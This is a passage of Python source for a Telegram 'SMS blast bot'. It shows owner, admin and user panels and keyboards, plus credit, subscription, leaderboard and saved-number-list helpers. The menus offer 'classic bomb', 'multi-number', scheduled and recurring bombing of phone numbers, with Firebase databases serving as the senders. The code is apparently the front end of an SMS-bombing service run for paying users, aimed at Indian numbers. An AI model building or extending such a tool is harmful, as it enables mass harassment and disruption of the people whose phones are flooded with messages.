        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    return "\n".join(lines)


# ================= ROUTER =================
R = Router()


# ================= SESSION CLASS =================
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']
    def __init__(self, uid: int):
        self.uid = uid; self.cancelled = False; self.sent = 0; self.failed = 0
        self.task = None; self.start_time = time.time(); self.lock = asyncio.Lock()
        self.number = None; self.target_uid = None
# =====================================================================
# PART 2 — Panel Texts, Keyboards (2-page user), Firebase, Workers
# =====================================================================
# ⚠️ Isko PART 1 ke turant baad paste karo
# =====================================================================


# ================= PANEL TEXTS =================
def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    protected_count = len(PROTECTED_NUMBERS)
    scheduled_count = len(scheduled_bombs)
    maint = "🔴 ON" if is_maintenance(d) else "🟢 OFF"
    contest = "🟢 ON" if d.get("referral_contest", {}).get("enabled") else "🔴 OFF"

    valid_count = 0
    for uid_str, u in users.items():
        v = get_validity_info(int(uid_str), d)
        if v["has_validity"] and not v["is_expired"]:
            valid_count += 1

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n"
        f"🕐 <b>IST:</b> <code>{ist_str('%d/%m/%Y %I:%M:%S %p')}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔥 ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"👑 ᴏᴡɴᴇʀs        : <b>{len(owners)}</b>/6\n"
        f"🛡 ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"🎫 ᴠᴀʟɪᴅ ᴜsᴇʀs   : <b>{valid_count}</b>\n"
        f"📹 ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"🚀 ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"⏰ sᴄʜᴇᴅᴜʟᴇᴅ    : <b>{scheduled_count}</b>\n"
        f"🔓 ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"📢 ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"🔒 ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"🛠 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ : {maint}\n"
        f"🏆 ᴄᴏɴᴛᴇsᴛ       : {contest}\n"
        f"🔄 sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    protected_count = len(PROTECTED_NUMBERS)
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n"
        f"🕐 IST: <code>{ist_time_str()}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"🚫 ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"🚀 ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"🔒 ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"🔄 sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def user_home_text(uid: int, d: dict, page: int = 1) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 5)
    scan_info = get_scan_status()
    display_name = get_display_name(uid, d)
    v = get_validity_info(uid, d)

    if v["has_validity"]:
        if v["is_expired"]:
            validity_line = f"{em(EMOJI_CROSS, '⏰')} ᴠᴀʟɪᴅɪᴛʏ : <b>Expired</b> ({v['plan_name']})"
        elif v["days_left"] >= 1:
            pct = get_validity_percent(uid, d)
            bar = validity_progress_bar(100 - pct)
            validity_line = f"{em(EMOJI_CHECK, '🎫')} ᴠᴀʟɪᴅɪᴛʏ : <b>{v['plan_name']}</b> • {v['days_left']}ᴅ ʟᴇғᴛ\n   <code>{bar}</code>"
        else:
            pct = get_validity_percent(uid, d)
            bar = validity_progress_bar(100 - pct)
            validity_line = f"{em(EMOJI_WARNING, '⏳')} ᴠᴀʟɪᴅɪᴛʏ : <b>{v['plan_name']}</b> • {v['hours_left']}ʜ ʟᴇғᴛ\n   <code>{bar}</code>"
    else:
        validity_line = f"{em(EMOJI_CROSS, '❌')} ᴠᴀʟɪᴅɪᴛʏ : <b>No Plan</b>"

    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n"
        f"🕐 IST: <code>{ist_time_str()}</code>\n\n"
        f"👤 {sc('name')}    : <b>{display_name[:20]}</b>\n"
        f"👤 ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{validity_line}\n"
        f"💰 ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"🔢 ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"🔥 ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"🔄 sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"📄 <b>ᴘᴀɢᴇ {page}/2</b>\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )


def get_live_dashboard(d: dict) -> str:
    now = int(time.time())
    today_start = now - (now % 86400) - 19800
    users = d.get("users", {})
    history = d.get("sms_history", {})
    total_users = len(users)
    new_today = 0
    total_credits = 0
    blast_today = 0
    for uid_str, u in users.items():
        if u.get("joined_at", 0) >= today_start: new_today += 1
        total_credits += u.get("credits", 0)
    for uid_str, hlist in history.items():
        for entry in hlist:
            if entry.get("timestamp", 0) >= today_start:
                blast_today += 1; break
    lb = get_leaderboard(d, 3)
    lb_lines = []
    medals = ["🥇", "🥈", "🥉"]
    for i, (uid, name, uses) in enumerate(lb):
        lb_lines.append(f"  {medals[i] if i < 3 else '🏅'} {name[:15]} — {uses} sᴍs")
    lb_text = "\n".join(lb_lines) if lb_lines else "  ɴᴏ ᴅᴀᴛᴀ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scheduled_count = len([x for x in scheduled_bombs.values() if x.get("run_at", 0) > now])
    queued_count = sum(len(q) for q in BOMB_QUEUE.values())
    maint_status = "🔴 ON" if is_maintenance(d) else "🟢 OFF"
    return (
        f"📊 <b>LIVE DASHBOARD</b>\n"
        f"<i>🕐 IST: {ist_time_str()}</i>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{total_users}</b>\n"
        f"🆕 ɴᴇᴡ ᴛᴏᴅᴀʏ     : <b>{new_today}</b>\n"
        f"📤 ʙʟᴀsᴛ ᴛᴏᴅᴀʏ   : <b>{blast_today}</b>\n"
        f"💳 ᴄʀᴇᴅɪᴛs ɪɴ ᴄɪʀᴄ: <b>{total_credits}</b>\n"
        f"🚀 ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active_sessions}</b>\n"
        f"⏰ sᴄʜᴇᴅᴜʟᴇᴅ   : <b>{scheduled_count}</b>\n"
        f"⏳ ǫᴜᴇᴜᴇᴅ      : <b>{queued_count}</b>\n"
        f"🛠 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ : {maint_status}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🏆 <b>ᴛᴏᴘ 3 ᴜsᴇʀs</b>\n{lb_text}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )


def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [f"📊 <b>{sc('api stats')}</b>\n",
             f"📤 ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
             f"❌ ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
             "━━━━━━━━━━━━━━━━━━", f"<b>{sc('per firebase:')}</b>"]
    if not api_use:
        lines.append(f"  😴 ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        lines.append(f"🔥 {label}\n   ✅ {fb_stats.get('sent', 0)} sᴇɴᴛ  ❌ {fb_stats.get('failed', 0)} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)


# ================= KEYBOARDS =================
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ʟɪᴠᴇ ᴅᴀsʜʙᴏᴀʀᴅ", "owner:dashboard", EMOJI_STAR, "📊"), btn("ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "owner:leaderboard", EMOJI_CROWN, "🏆")],
        [btn("ʀᴇғᴇʀ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "owner:ref_leaderboard", EMOJI_GIFT, "🎁"), btn("🎫 ᴠᴀʟɪᴅɪᴛʏ", "owner:validity:menu", EMOJI_CHECK, "🎫")],
        [btn("💎 sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "owner:sub:menu", EMOJI_CROWN, "💎"), btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜")],
        [btn("ᴘʀɪᴄɪɴɢ", "owner:pricing:menu", EMOJI_MONEY, "💳"), btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁")],
        [btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰")],
        [btn("ᴀᴅᴅ ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰")],
        [btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗"), btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️")],
        [btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒"), btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐")],
        [btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊"), btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤")],
        [btn("🛠 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ", "owner:maintenance", EMOJI_WARNING, "🛠"), btn("🏆 ᴄᴏɴᴛᴇsᴛ", "owner:contest", EMOJI_CROWN, "🏆")],
        [btn("🎲 ʟᴜᴄᴋʏ ᴅʀᴀᴡ", "owner:lucky_draw", EMOJI_GIFT, "🎲"), btn("🔔 ɴᴏᴛɪғ ᴘʀᴇғs", "owner:notif_prefs", EMOJI_BELL, "🔔")],
        [btn("🔥 ғʙ ʜᴇᴀʟᴛʜ", "owner:fb_health", EMOJI_FIRE, "🔥"), btn("💾 ʙᴀᴄᴋᴜᴘ", "owner:backup", EMOJI_CHECK, "💾")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "owner:classic_bomb", EMOJI_ROCKET, "💥"), btn("🎯 ᴍᴜʟᴛɪ-ɴᴜᴍʙᴇʀ", "owner:multi_bomb", EMOJI_STAR, "🎯")],
        [btn("⏰ sᴄʜᴇᴅᴜʟᴇ", "owner:schedule_bomb", EMOJI_WARNING, "⏰"), btn("🔁 ʀᴇᴄᴜʀʀɪɴɢ", "owner:recurring", EMOJI_GEAR, "🔁")],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])


def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊")],
        [btn("ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "admin:leaderboard", EMOJI_CROWN, "🏆"), btn("ʀᴇғᴇʀ ʟʙ", "admin:ref_leaderboard", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "admin:classic_bomb", EMOJI_ROCKET, "💥"), btn("🎯 ᴍᴜʟᴛɪ-ɴᴜᴍʙᴇʀ", "admin:multi_bomb", EMOJI_STAR, "🎯")],
        [btn("⏰ sᴄʜᴇᴅᴜʟᴇ", "admin:schedule_bomb", EMOJI_WARNING, "⏰"), btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")],
    ])


def user_kb_page1() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤")],
        [btn("💥 ᴄʟᴀssɪᴄ ʙᴏᴍʙ", "user:classic_bomb", EMOJI_ROCKET, "💥"),
         btn("🎯 ᴍᴜʟᴛɪ-ɴᴜᴍʙᴇʀ", "user:multi_bomb", EMOJI_STAR, "🎯")],
        [btn("⏰ sᴄʜᴇᴅᴜʟᴇ", "user:schedule_bomb", EMOJI_WARNING, "⏰"),
         btn("🔁 ʀᴇᴄᴜʀʀɪɴɢ", "user:recurring", EMOJI_GEAR, "🔁")],
        [btn("📋 ᴍʏ ʟɪsᴛs", "user:lists:menu", EMOJI_STAR, "📋"),
         btn("📝 ᴛᴇᴍᴘʟᴀᴛᴇs", "user:templates:menu", EMOJI_GEAR, "📝")],
        [btn("⏳ ᴍʏ ǫᴜᴇᴜᴇ", "user:queue:view", EMOJI_GEAR, "⏳"),
         btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳"),
         btn("🎫 ᴠᴀʟɪᴅɪᴛʏ", "user:validity", EMOJI_CHECK, "🎫")],
        [btn("➡️ ᴍᴏʀᴇ ᴏᴘᴛɪᴏɴs", "user:page:2", EMOJI_GEAR, "➡️")],
    ])


def user_kb_page2() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("💎 ʙᴜʏ ᴘʟᴀɴ", "user:subscription", EMOJI_CROWN, "💎"),
         btn("🎡 sᴘɪɴ ᴡʜᴇᴇʟ", "user:spin", EMOJI_GIFT, "🎡")],
        [btn("🏆 ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "user:leaderboard", EMOJI_CROWN, "🏆"),
         btn("🎁 ʀᴇғ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "user:ref_leaderboard", EMOJI_GIFT, "🎁")],
        [btn("🎯 ᴍɪʟᴇsᴛᴏɴᴇs", "user:milestones", EMOJI_STAR, "🎯"),
         btn("🏅 ᴀᴄʜɪᴇᴠᴇᴍᴇɴᴛs", "user:achievements", EMOJI_CROWN, "🏅")],
        [btn("🎯 ᴍɪssɪᴏɴs", "user:missions", EMOJI_STAR, "🎯"),
         btn("🏆 ᴛᴏᴜʀɴᴀᴍᴇɴᴛ", "user:tournament", EMOJI_CROWN, "🏆")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁"),
         btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊"),
         btn("sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰"),
         btn("ᴛʀᴀɴsғᴇʀ", "user:transfer", EMOJI_MONEY, "💸")],
        [btn("👤 ᴘʀᴏғɪʟᴇ", "user:profile", EMOJI_STAR, "👤"),
         btn("🌐 ʟᴀɴɢᴜᴀɢᴇ", "user:language", EMOJI_GEAR, "🌐")],
        [btn("🔔 ɴᴏᴛɪғ ᴘʀᴇғs", "user:notif_prefs", EMOJI_BELL, "🔔"),
         btn("📚 ᴛᴜᴛᴏʀɪᴀʟ", "user:tutorial", EMOJI_GEAR, "📚")],
        [btn("⬅️ ʙᴀᴄᴋ", "user:page:1", EMOJI_GEAR, "⬅️"),
         btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])


def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        rows.append([btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start_idx = page * per_page
    current_fbs = fbs[start_idx:start_idx + per_page]
    rows = [[btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
             btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")]]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16: label = label[:14] + ".."
        rows.append([btn(label, "noop", EMOJI_FIRE, "🔥"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")])
    nav_row = []
    if page > 0: nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1: nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row: rows.append(nav_row)
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                         btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"👥 <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = get_display_name(uid, d)
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 5)
        v = get_validity_info(uid, d)
        vtag = ""
        if v["has_validity"] and not v["is_expired"]: vtag = f" 🎫{v['days_left']}ᴅ"
        elif v["is_expired"]: vtag = " ⏰ᴇxᴘ"
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:15]}{vtag} | 💰{credits} | 📤{uses}")
    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)


def templates_kb(uid: int, d: dict, prefix: str = "user") -> InlineKeyboardMarkup:
    templates = get_user_templates(uid, d)
    rows = []
    for idx, t in enumerate(templates):
        rows.append([
            btn(f"📝 {t['name'][:15]}", f"{prefix}:template:use:{idx}", EMOJI_CHECK, "📝"),
            btn("✏️", f"{prefix}:template:edit:{idx}", EMOJI_GEAR, "✏️"),
            btn("🗑", f"{prefix}:template:del:{idx}", EMOJI_CROSS, "🗑")
        ])
    rows.append([btn("➕ ᴀᴅᴅ ɴᴇᴡ", f"{prefix}:template:add", EMOJI_CHECK, "➕")])
    if prefix == "user":
        rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ================= LEADERBOARDS =================
def get_leaderboard(d: dict, top: int = 10) -> list:
    users = d.get("users", {})
    arr = []
    for uid_str, u in users.items():
        try:
            arr.append((int(uid_str), get_display_name(int(uid_str), d), u.get("uses", 0)))
        except: pass
    arr.sort(key=lambda x: x[2], reverse=True)
    return arr[:top]


def get_referral_leaderboard(d: dict, top: int = 10) -> list:
    users = d.get("users", {})
    arr = []
    for uid_str, u in users.items():
        try:
            arr.append((int(uid_str), get_display_name(int(uid_str), d), u.get("refer_count", 0)))
        except: pass
    arr.sort(key=lambda x: x[2], reverse=True)
    return arr[:top]


# ================= SAVED LISTS =================
def get_user_lists(uid: int, d: dict) -> list:
    return d.get("users", {}).get(str(uid), {}).get("saved_lists", [])


def save_user_list(uid: int, name: str, numbers: list, d: dict) -> bool:
    k = str(uid)
    if k not in d.get("users", {}): return False
    if "saved_lists" not in d["users"][k]: d["users"][k]["saved_lists"] = []
    for lst in d["users"][k]["saved_lists"]:
        if lst.get("name") == name: return False
    d["users"][k]["saved_lists"].append({"name": name, "numbers": numbers, "created_at": int(time.time())})
    return True


def delete_user_list(uid: int, list_name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d.get("users", {}): return False
    lists = d["users"][k].get("saved_lists", [])
    before = len(lists)
    d["users"][k]["saved_lists"] = [l for l in lists if l.get("name") != list_name]
    return len(d["users"][k]["saved_lists"]) < before


def parse_numbers(raw: str) -> list:
    """Universal number parser — supports all formats."""
    parts = re.split(r'[,\n\r]+', raw.strip())
    nums = []
    for part in parts:
        for sub_part in part.split():
            if not sub_part.strip(): continue
            parsed = extract_indian_number(sub_part)
            if parsed: nums.append(parsed)
    return list(dict.fromkeys(nums))


# ================= TEMPLATES =================
def get_user_templates(uid: int, d: dict) -> list:
    return d.get("users", {}).get(str(uid), {}).get("templates", [])


def save_user_template(uid: int, name: str, text: str, d: dict) -> tuple:
    k = str(uid)
    if k not in d.get("users", {}): return False, "User not found"
    if "templates" not in d["users"][k]: d["users"][k]["templates"] = []
    templates = d["users"][k]["templates"]
    max_limit = d.get("template_limit", 10)
    if len(templates) >= max_limit: return False, f"Max {max_limit} templates"
    for t in templates:
        if t.get("name") == name: return False, "Template pehle se hai"
    templates.append({"name": name, "text": text, "created_at": int(time.time()), "uses": 0})
    return True, "Saved!"


def delete_user_template(uid: int, template_name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d.get("users", {}): return False
    templates = d["users"][k].get("templates", [])
    before = len(templates)
    d["users"][k]["templates"] = [t for t in templates if t.get("name") != template_name]
    return len(d["users"][k]["templates"]) < before


def increment_template_use(uid: int, template_name: str, d: dict):
    k = str(uid)
    if k not in d.get("users", {}): return
